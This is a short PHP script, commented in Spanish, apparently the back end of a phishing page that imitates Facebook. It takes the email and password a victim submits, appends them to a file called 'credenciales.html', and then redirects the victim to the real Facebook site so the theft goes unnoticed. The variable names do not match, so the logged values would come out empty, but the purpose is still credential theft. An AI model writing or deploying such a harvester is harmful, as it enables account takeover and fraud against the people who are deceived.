<?php

$Correo = $_POST['email']; 

$Contraseña = $_POST['pass'];

$SALTO="\r\n";

$f = fopen("credenciales.html", "a");
fwrite ($f, "----------------------------------".$SALTO.'Correo: '.$email.$SALTO.'Contraseña: '.$pass.$SALTO."----------------------------------".$SALTO);
fclose($f);

sleep(2);

//Redireccione a la web original (Facebook)

header('Location: https://www.facebook.com/');
?>